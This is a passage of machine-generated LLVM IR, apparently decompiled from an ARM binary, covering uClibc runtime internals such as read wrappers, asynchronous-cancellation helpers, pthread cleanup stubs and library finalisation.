  %v1_196fc = call i32 @__libc_disable_asynccancel(i32 %v0_196e0)
  %v0_19700 = load i32, i32* @r7, align 4
  store i32 %v0_19700, i32* @r0, align 4
  %v2_19704 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19704, i32* @r7, align 4
  store i32 %v18_196dc, i32* @lr, align 4
  %v2_19708 = icmp ugt i32 %v0_19700, -4097
  %v7_19708 = icmp eq i32 %v0_19700, -4096
  store i1 %v7_19708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19708, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_196dc
  %v0_19710 = call i32 @__syscall_error()
  %v0_19720 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19720, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_19720 = load i32, i32* @r1, align 4
  %v2_19720 = load i32, i32* @r4, align 4
  %v5_19720 = mul i32 %v2_19720, 536870912
  %v6_19720 = and i32 %v5_19720, %v1_19720
  call void @__pseudo_branch(i32 %v6_19720)
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_19710, { 1, 0 }
  uselistorder i32 %v0_19700, { 0, 2, 3, 1 }
  uselistorder i32 %v0_196d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_196dc, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_19734 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_19734, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_19734 = load i32, i32* @r0, align 4
  ret i32 %v2_19734

bb1:                                              ; preds = %entry
  %v0_19738 = call i32 @__syscall_error()
  ret i32 %v0_19738
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_19744 = load i32, i32* @global_var_395d0.1593, align 4
  %v2_19748 = icmp eq i32 %v3_19744, 0
  br i1 %v2_19748, label %dec_label_pc_19750, label %entry.dec_label_pc_1976c_crit_edge

entry.dec_label_pc_1976c_crit_edge:               ; preds = %entry
  %v3_1976c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1976c

dec_label_pc_19750:                               ; preds = %entry
  %v0_19750 = load i32, i32* @r7, align 4
  store i32 %v0_19750, i32* @ip, align 4
  %v0_19760 = load i32, i32* @r0, align 4
  %v2_19760 = icmp ugt i32 %v0_19760, -4097
  br i1 %v2_19760, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1976c, %dec_label_pc_19750
  %merge = phi i32 [ %v0_19760, %dec_label_pc_19750 ], [ %v0_19790, %dec_label_pc_1976c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_19750
  %v0_19768 = call i32 @__syscall_error()
  br label %dec_label_pc_1976c

dec_label_pc_1976c:                               ; preds = %entry.dec_label_pc_1976c_crit_edge, %bb8
  %v3_1976c = phi i32 [ %v3_1976c.pre, %entry.dec_label_pc_1976c_crit_edge ], [ %v0_19768, %bb8 ]
  store i32 %v3_1976c, i32* %stack_var_-24, align 4
  %v6_1976c = load i32, i32* @r1, align 4
  %v15_1976c = load i32, i32* @r7, align 4
  store i32 %v15_1976c, i32* %stack_var_-8, align 4
  %v18_1976c = load i32, i32* @lr, align 4
  %v0_19770 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_19770, i32* @ip, align 4
  %v2_19778 = load i32, i32* %stack_var_-24, align 4
  store i32 %v6_1976c, i32* @r1, align 4
  store i32 %v2_19778, i32* @r7, align 4
  %v1_1978c = call i32 @__libc_disable_asynccancel(i32 %v0_19770)
  %v0_19790 = load i32, i32* @r7, align 4
  store i32 %v0_19790, i32* @r0, align 4
  %v2_19794 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19794, i32* @r7, align 4
  store i32 %v18_1976c, i32* @lr, align 4
  %v2_19798 = icmp ugt i32 %v0_19790, -4097
  br i1 %v2_19798, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1976c
  %v0_197a0 = call i32 @__syscall_error()
  ret i32 %v0_197a0

; uselistorder directives
  uselistorder i32 %v0_19790, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 1, 0, 12, 5, 4, 11, 3, 2, 10, 8, 7, 9, 6 }
  uselistorder label %dec_label_pc_1976c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_197b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_197b0 = and i32 %v0_197b0, 2
  %v2_197b0 = icmp eq i32 %v1_197b0, 0
  %v3_197b4 = load i32, i32* @r4, align 4
  store i32 %v3_197b4, i32* %stack_var_-16, align 4
  br i1 %v2_197b0, label %dec_label_pc_197bc, label %dec_label_pc_19830

dec_label_pc_197bc:                               ; preds = %entry
  %v0_197bc = call i32 @__aeabi_read_tp()
  store i32 %v0_197bc, i32* %r0.global-to-local, align 4
  %v1_197c0 = add i32 %v0_197bc, -1036
  %v2_197c0 = inttoptr i32 %v1_197c0 to i32*
  %v3_197c0 = load i32, i32* %v2_197c0, align 4
  %v1_197c4 = add i32 %v0_197bc, -1168
  store i32 %v1_197c4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_197c8

dec_label_pc_197c8:                               ; preds = %dec_label_pc_197fc.dec_label_pc_197c8_crit_edge, %dec_label_pc_197bc
  %v0_197d4 = phi i32 [ %v0_197d4.pre, %dec_label_pc_197fc.dec_label_pc_197c8_crit_edge ], [ %v1_197c4, %dec_label_pc_197bc ]
  %v0_197c8 = phi i32 [ %v0_197fc, %dec_label_pc_197fc.dec_label_pc_197c8_crit_edge ], [ %v3_197c0, %dec_label_pc_197bc ]
  %v1_197c8 = and i32 %v0_197c8, -3
  store i32 %v1_197c8, i32* %r7.global-to-local, align 4
  store i32 %v0_197c8, i32* %r4.global-to-local, align 4
  store i32 %v1_197c8, i32* @r1, align 4
  %v1_197d4 = add i32 %v0_197d4, 132
  store i32 %v1_197d4, i32* @r2, align 4
  %v1_197d823 = inttoptr i32 %v1_197d4 to i32*
  %v2_197d824 = load i32, i32* %v1_197d823, align 4
  %v3_197dc26 = icmp uge i32 %v2_197d824, %v0_197c8
  store i1 %v3_197dc26, i1* %cpsr_c.global-to-local, align 1
  %v9_197dc32 = icmp eq i32 %v2_197d824, %v0_197c8
  br i1 %v9_197dc32, label %dec_label_pc_197e4, label %dec_label_pc_197fc

dec_label_pc_197e4:                               ; preds = %dec_label_pc_197c8, %dec_label_pc_197e4.dec_label_pc_197d8_crit_edge
  %v0_197e433 = phi i32 [ %v1_197dc.pre, %dec_label_pc_197e4.dec_label_pc_197d8_crit_edge ], [ %v0_197c8, %dec_label_pc_197c8 ]
  store i32 %v0_197e433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_197f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_197f4, label %dec_label_pc_197f8, label %dec_label_pc_197e4.dec_label_pc_197d8_crit_edge

dec_label_pc_197e4.dec_label_pc_197d8_crit_edge:  ; preds = %dec_label_pc_197e4
  %v0_197d8.pre = load i32, i32* @r2, align 4
  %v1_197dc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_197d8 = inttoptr i32 %v0_197d8.pre to i32*
  %v2_197d8 = load i32, i32* %v1_197d8, align 4
  %v3_197dc = icmp uge i32 %v2_197d8, %v1_197dc.pre
  store i1 %v3_197dc, i1* %cpsr_c.global-to-local, align 1
  %v9_197dc = icmp eq i32 %v2_197d8, %v1_197dc.pre
  br i1 %v9_197dc, label %dec_label_pc_197e4, label %dec_label_pc_197fc

dec_label_pc_197f8:                               ; preds = %dec_label_pc_197e4
  %v0_197f8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_197fc

dec_label_pc_197fc:                               ; preds = %dec_label_pc_197c8, %dec_label_pc_197e4.dec_label_pc_197d8_crit_edge, %dec_label_pc_197f8
  %v0_197fc = phi i32 [ %v0_197f8, %dec_label_pc_197f8 ], [ %v2_197d824, %dec_label_pc_197c8 ], [ %v2_197d8, %dec_label_pc_197e4.dec_label_pc_197d8_crit_edge ]
  %v1_197fc = phi i32 [ %v0_197f8, %dec_label_pc_197f8 ], [ %v0_197c8, %dec_label_pc_197c8 ], [ %v1_197dc.pre, %dec_label_pc_197e4.dec_label_pc_197d8_crit_edge ]
  %v3_197fc = icmp uge i32 %v0_197fc, %v1_197fc
  store i1 %v3_197fc, i1* %cpsr_c.global-to-local, align 1
  %v9_197fc = icmp eq i32 %v0_197fc, %v1_197fc
  br i1 %v9_197fc, label %dec_label_pc_19824.preheader, label %dec_label_pc_197fc.dec_label_pc_197c8_crit_edge

dec_label_pc_197fc.dec_label_pc_197c8_crit_edge:  ; preds = %dec_label_pc_197fc
  %v0_197d4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_197c8

dec_label_pc_19824.preheader:                     ; preds = %dec_label_pc_197fc
  %v0_198241 = load i32, i32* %r7.global-to-local, align 4
  %v1_198242 = and i32 %v0_198241, 12
  store i32 %v1_198242, i32* @r3, align 4
  %v2_198283 = icmp ugt i32 %v1_198242, 3
  store i1 %v2_198283, i1* %cpsr_c.global-to-local, align 1
  %v7_198285 = icmp eq i32 %v1_198242, 4
  br i1 %v7_198285, label %dec_label_pc_19808.lr.ph, label %dec_label_pc_19824.preheader.dec_label_pc_19830.loopexit_crit_edge

dec_label_pc_19824.preheader.dec_label_pc_19830.loopexit_crit_edge: ; preds = %dec_label_pc_19824.preheader
  %v1_19834.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19830.loopexit

dec_label_pc_19808.lr.ph:                         ; preds = %dec_label_pc_19824.preheader
  %v0_1980c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1980c = add i32 %v0_1980c.pre, 132
  %v2_19820 = inttoptr i32 %v1_1980c to i32*
  br label %dec_label_pc_19808

dec_label_pc_19808:                               ; preds = %dec_label_pc_19808.lr.ph, %dec_label_pc_19808
  %v0_19808 = phi i32 [ %v0_198241, %dec_label_pc_19808.lr.ph ], [ %v3_19820, %dec_label_pc_19808 ]
  store i32 %v0_19808, i32* @r2, align 4
  store i32 %v1_1980c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_19820 = load i32, i32* %v2_19820, align 4
  store i32 %v3_19820, i32* %r7.global-to-local, align 4
  %v1_19824 = and i32 %v3_19820, 12
  store i32 %v1_19824, i32* @r3, align 4
  %v7_19828 = icmp eq i32 %v1_19824, 4
  br i1 %v7_19828, label %dec_label_pc_19808, label %dec_label_pc_19824.dec_label_pc_19830.loopexit_crit_edge

dec_label_pc_19824.dec_label_pc_19830.loopexit_crit_edge: ; preds = %dec_label_pc_19808
  %v2_19828 = icmp ugt i32 %v1_19824, 3
  store i1 %v2_19828, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_19830.loopexit

dec_label_pc_19830.loopexit:                      ; preds = %dec_label_pc_19824.preheader.dec_label_pc_19830.loopexit_crit_edge, %dec_label_pc_19824.dec_label_pc_19830.loopexit_crit_edge
  %v1_19834.pre = phi i32 [ %v1_19834.pre.pre, %dec_label_pc_19824.preheader.dec_label_pc_19830.loopexit_crit_edge ], [ %v1_1980c, %dec_label_pc_19824.dec_label_pc_19830.loopexit_crit_edge ]
  %v2_19830.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_19830

dec_label_pc_19830:                               ; preds = %dec_label_pc_19830.loopexit, %entry
  %v1_19834 = phi i32 [ %v1_19834.pre, %dec_label_pc_19830.loopexit ], [ %v0_197b0, %entry ]
  %v2_19830 = phi i32 [ %v2_19830.pre, %dec_label_pc_19830.loopexit ], [ %v3_197b4, %entry ]
  store i32 %v2_19830, i32* @r4, align 4
  ret i32 %v1_19834

; uselistorder directives
  uselistorder i32 %v3_19820, { 1, 2, 0 }
  uselistorder i32 %v1_1980c, { 0, 2, 1 }
  uselistorder i32 %v0_197f8, { 1, 0 }
  uselistorder i32 %v1_197dc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_197c8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_19830.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_19808, { 1, 0 }
  uselistorder label %dec_label_pc_197fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_197e4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_19838 = load i32, i32* @r4, align 4
  store i32 %v3_19838, i32* %stack_var_-24, align 4
  store i32 100304, i32* %r8.global-to-local, align 4
  %v0_19840 = call i32 @__aeabi_read_tp()
  %v1_19844 = add i32 %v0_19840, -1036
  %v2_19844 = inttoptr i32 %v1_19844 to i32*
  %v3_19844 = load i32, i32* %v2_19844, align 4
  store i32 %v3_19844, i32* %r6.global-to-local, align 4
  %v1_19848 = add i32 %v0_19840, -1168
  store i32 %v1_19848, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r8.global-to-local, align 4
  %v1_1985046 = or i32 %v3_19844, 2
  store i32 %v1_1985046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1985449 = icmp eq i32 %v1_1985046, %v3_19844
  br i1 %v9_1985449, label %dec_label_pc_19900, label %dec_label_pc_1985c

dec_label_pc_1985c:                               ; preds = %entry, %bb.dec_label_pc_1985c_crit_edge
  %v0_19860 = phi i32 [ %v0_19860.pre, %bb.dec_label_pc_1985c_crit_edge ], [ %v1_19848, %entry ]
  %v1_1985051 = phi i32 [ %v1_19850, %bb.dec_label_pc_1985c_crit_edge ], [ %v1_1985046, %entry ]
  %v0_1986450 = phi i32 [ %v1_19890, %bb.dec_label_pc_1985c_crit_edge ], [ %v3_19844, %entry ]
  store i32 %v1_1985051, i32* @r1, align 4
  %v1_19860 = add i32 %v0_19860, 132
  store i32 %v1_19860, i32* %r2.global-to-local, align 4
  store i32 %v0_1986450, i32* %r4.global-to-local, align 4
  %v1_1986834 = inttoptr i32 %v1_19860 to i32*
  %v2_1986835 = load i32, i32* %v1_1986834, align 4
  store i32 %v2_1986835, i32* @r3, align 4
  %v3_1986c37 = icmp uge i32 %v2_1986835, %v0_1986450
  store i1 %v3_1986c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1986c43 = icmp eq i32 %v2_1986835, %v0_1986450
  br i1 %v9_1986c43, label %dec_label_pc_19874, label %dec_label_pc_1988c

dec_label_pc_19874:                               ; preds = %dec_label_pc_1985c, %dec_label_pc_19874.dec_label_pc_19868_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_19884 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_19884, label %dec_label_pc_19888, label %dec_label_pc_19874.dec_label_pc_19868_crit_edge

dec_label_pc_19874.dec_label_pc_19868_crit_edge:  ; preds = %dec_label_pc_19874
  %v0_19868.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1986c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_19868 = inttoptr i32 %v0_19868.pre to i32*
  %v2_19868 = load i32, i32* %v1_19868, align 4
  store i32 %v2_19868, i32* @r3, align 4
  %v3_1986c = icmp uge i32 %v2_19868, %v1_1986c.pre
  store i1 %v3_1986c, i1* %cpsr_c.global-to-local, align 1
  %v9_1986c = icmp eq i32 %v2_19868, %v1_1986c.pre
  br i1 %v9_1986c, label %dec_label_pc_19874, label %dec_label_pc_1988c

dec_label_pc_19888:                               ; preds = %dec_label_pc_19874
  %v0_19888 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19888, i32* @r3, align 4
  br label %dec_label_pc_1988c

dec_label_pc_1988c:                               ; preds = %dec_label_pc_1985c, %dec_label_pc_19874.dec_label_pc_19868_crit_edge, %dec_label_pc_19888
  %v1_19890 = phi i32 [ %v0_19888, %dec_label_pc_19888 ], [ %v2_1986835, %dec_label_pc_1985c ], [ %v2_19868, %dec_label_pc_19874.dec_label_pc_19868_crit_edge ]
  %v1_1988c = load i32, i32* %r6.global-to-local, align 4
  %v3_1988c = icmp uge i32 %v1_19890, %v1_1988c
  store i1 %v3_1988c, i1* %cpsr_c.global-to-local, align 1
  %v9_1988c = icmp eq i32 %v1_19890, %v1_1988c
  br i1 %v9_1988c, label %dec_label_pc_19898, label %bb

bb:                                               ; preds = %dec_label_pc_1988c
  store i32 %v1_19890, i32* %r6.global-to-local, align 4
  %v1_19850 = or i32 %v1_19890, 2
  store i32 %v1_19850, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_19854 = icmp eq i32 %v1_19850, %v1_19890
  br i1 %v9_19854, label %dec_label_pc_19900, label %bb.dec_label_pc_1985c_crit_edge

bb.dec_label_pc_1985c_crit_edge:                  ; preds = %bb
  %v0_19860.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1985c

dec_label_pc_19898:                               ; preds = %dec_label_pc_1988c
  %v0_19898 = load i32, i32* %r5.global-to-local, align 4
  %v1_19898 = and i32 %v0_19898, -69
  store i32 %v1_19898, i32* @r3, align 4
  %v2_1989c = icmp ugt i32 %v1_19898, 9
  store i1 %v2_1989c, i1* %cpsr_c.global-to-local, align 1
  %v7_1989c = icmp eq i32 %v1_19898, 10
  br i1 %v7_1989c, label %dec_label_pc_198a4, label %dec_label_pc_19900

dec_label_pc_198a4:                               ; preds = %dec_label_pc_19898
  %v1_198a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_198a8 = add i32 %v1_198a8, 544
  %v3_198a8 = inttoptr i32 %v2_198a8 to i32*
  store i32 -1, i32* %v3_198a8, align 4
  %v0_198ac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_198ac, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_198b0

dec_label_pc_198b0:                               ; preds = %dec_label_pc_198e4.dec_label_pc_198b0_crit_edge, %dec_label_pc_198a4
  %v0_198b4 = phi i32 [ %v0_198b4.pre, %dec_label_pc_198e4.dec_label_pc_198b0_crit_edge ], [ %v0_198ac, %dec_label_pc_198a4 ]
  %v0_198b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_198b0 = add i32 %v0_198b0, 132
  %v2_198b0 = inttoptr i32 %v1_198b0 to i32*
  %v3_198b0 = load i32, i32* %v2_198b0, align 4
  store i32 %v0_198b4, i32* %r2.global-to-local, align 4
  store i32 %v3_198b0, i32* %r4.global-to-local, align 4
  %v1_198bc = or i32 %v3_198b0, 16
  store i32 %v1_198bc, i32* @r1, align 4
  %v1_198c022 = inttoptr i32 %v0_198b4 to i32*
  %v2_198c023 = load i32, i32* %v1_198c022, align 4
  %v3_198c425 = icmp uge i32 %v2_198c023, %v3_198b0
  store i1 %v3_198c425, i1* %cpsr_c.global-to-local, align 1
  %v9_198c431 = icmp eq i32 %v2_198c023, %v3_198b0
  br i1 %v9_198c431, label %dec_label_pc_198cc, label %dec_label_pc_198e4

dec_label_pc_198cc:                               ; preds = %dec_label_pc_198b0, %dec_label_pc_198cc.dec_label_pc_198c0_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_198dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_198dc, label %dec_label_pc_198e0, label %dec_label_pc_198cc.dec_label_pc_198c0_crit_edge

dec_label_pc_198cc.dec_label_pc_198c0_crit_edge:  ; preds = %dec_label_pc_198cc
  %v0_198c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_198c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_198c0 = inttoptr i32 %v0_198c0.pre to i32*
  %v2_198c0 = load i32, i32* %v1_198c0, align 4
  %v3_198c4 = icmp uge i32 %v2_198c0, %v1_198c4.pre
  store i1 %v3_198c4, i1* %cpsr_c.global-to-local, align 1
  %v9_198c4 = icmp eq i32 %v2_198c0, %v1_198c4.pre
  br i1 %v9_198c4, label %dec_label_pc_198cc, label %dec_label_pc_198e4

dec_label_pc_198e0:                               ; preds = %dec_label_pc_198cc
  %v0_198e0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_198e4

dec_label_pc_198e4:                               ; preds = %dec_label_pc_198b0, %dec_label_pc_198cc.dec_label_pc_198c0_crit_edge, %dec_label_pc_198e0
  %v0_198e4 = phi i32 [ %v0_198e0, %dec_label_pc_198e0 ], [ %v2_198c023, %dec_label_pc_198b0 ], [ %v2_198c0, %dec_label_pc_198cc.dec_label_pc_198c0_crit_edge ]
  %v1_198e4 = phi i32 [ %v0_198e0, %dec_label_pc_198e0 ], [ %v3_198b0, %dec_label_pc_198b0 ], [ %v1_198c4.pre, %dec_label_pc_198cc.dec_label_pc_198c0_crit_edge ]
  %v3_198e4 = icmp uge i32 %v0_198e4, %v1_198e4
  store i1 %v3_198e4, i1* %cpsr_c.global-to-local, align 1
  %v9_198e4 = icmp eq i32 %v0_198e4, %v1_198e4
  br i1 %v9_198e4, label %dec_label_pc_198ec, label %dec_label_pc_198e4.dec_label_pc_198b0_crit_edge

dec_label_pc_198e4.dec_label_pc_198b0_crit_edge:  ; preds = %dec_label_pc_198e4
  %v0_198b4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_198b0

dec_label_pc_198ec:                               ; preds = %dec_label_pc_198e4
  store i32 128, i32* @r3, align 4
  %v0_198f4 = load i32, i32* %r8.global-to-local, align 4
  %v2_198f4 = add i32 %v0_198f4, 128
  %v3_198f4 = inttoptr i32 %v2_198f4 to i32*
  %v4_198f4 = load i32, i32* %v3_198f4, align 4
  store i32 %v4_198f4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_198f4)
  %v0_19900.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19900

dec_label_pc_19900:                               ; preds = %entry, %bb, %dec_label_pc_19898, %dec_label_pc_198ec
  %v0_19900 = phi i32 [ %v1_19890, %dec_label_pc_19898 ], [ %v0_19900.pre, %dec_label_pc_198ec ], [ %v3_19844, %entry ], [ %v1_19890, %bb ]
  %v2_19904 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_19904, i32* @r4, align 4
  ret i32 %v0_19900

; uselistorder directives
  uselistorder i32 %v0_198e0, { 1, 0 }
  uselistorder i32 %v1_198c4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_19850, { 1, 2, 0 }
  uselistorder i32 %v1_1988c, { 1, 0 }
  uselistorder i32 %v1_19890, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1986c.pre, { 1, 0 }
  uselistorder i32 %v0_1986450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19900, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_198e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_198cc, { 1, 0 }
  uselistorder label %dec_label_pc_1988c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19874, { 1, 0 }
  uselistorder label %dec_label_pc_1985c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_19924 = add i32 %tmp, 4
  %v4_19924 = inttoptr i32 %v3_19924 to i32*
  store i32 %arg3, i32* %v4_19924, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_19930 = icmp eq i32 %arg2, 0
  br i1 %v2_19930, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1993c = add i32 %tmp, 4
  %v3_1993c = inttoptr i32 %v2_1993c to i32*
  %v4_1993c = load i32, i32* %v3_1993c, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_19948 = phi i32 [ %tmp, %entry ], [ %v4_1993c, %bb ]
  %v4_19948 = call i32 @__libc_errno(i32 %v3_19948)
  ret i32 %v4_19948

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32)* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1997c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19958 = load i32, i32* @r4, align 4
  store i32 %v3_19958, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -28), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1997c

dec_label_pc_1997c:                               ; preds = %dec_label_pc_1997c.dec_label_pc_1997c_crit_edge, %dec_label_pc_1997c.lr.ph
  %v1_1997c = phi i32 [ %v1_19988, %dec_label_pc_1997c.dec_label_pc_1997c_crit_edge ], [ 0, %dec_label_pc_1997c.lr.ph ]
  %v0_1997c = phi i32 [ %v0_1997c.pre, %dec_label_pc_1997c.dec_label_pc_1997c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -28), %dec_label_pc_1997c.lr.ph ]
  %v4_1997c = mul i32 %v1_1997c, 4
  %v5_1997c = add i32 %v4_1997c, %v0_1997c
  %v6_1997c = inttoptr i32 %v5_1997c to i32*
  %v7_1997c = load i32, i32* %v6_1997c, align 4
  call void @__pseudo_branch(i32 %v7_1997c)
  %v0_19988 = load i32, i32* %r4.global-to-local, align 4
  %v1_19988 = add i32 %v0_19988, -1
  store i32 %v1_19988, i32* %r4.global-to-local, align 4
  %v2_19988 = icmp eq i32 %v0_19988, 0
  br i1 %v2_19988, label %dec_label_pc_19990, label %dec_label_pc_1997c.dec_label_pc_1997c_crit_edge

dec_label_pc_1997c.dec_label_pc_1997c_crit_edge:  ; preds = %dec_label_pc_1997c
  %v0_1997c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1997c

dec_label_pc_19990:                               ; preds = %dec_label_pc_1997c
  %v0_19994.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_19994 = add i32 %v0_19994.pre, 27692
  %v3_19994 = inttoptr i32 %v2_19994 to i32*
  %v4_19994 = load i32, i32* %v3_19994, align 4
  %v2_19998 = icmp eq i32 %v4_19994, 0
  br i1 %v2_19998, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_19990
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_19990, %bb
  %v2_199a0 = xor i1 %v2_19998, true
  call void @__pseudo_cond_branch(i1 %v2_199a0, i32 %v4_19994)
  %v0_199a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_199a8 = add i32 %v0_199a8, 27696
  %v3_199a8 = inttoptr i32 %v2_199a8 to i32*
  %v4_199a8 = load i32, i32* %v3_199a8, align 4
  %v2_199ac = icmp eq i32 %v4_199a8, 0
  br i1 %v2_199ac, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_199b4 = xor i1 %v2_199ac, true
  call void @__pseudo_cond_branch(i1 %v2_199b4, i32 %v4_199a8)
  %v2_199b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_199b8, i32* %r4.global-to-local, align 4
  %v1_199bc = load i32, i32* @r0, align 4
  ret i32 %v1_199bc

; uselistorder directives
  uselistorder i32 %v1_19988, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_199d4 = load i32, i32* @r4, align 4
  %v6_199d4 = load i32, i32* @r5, align 4
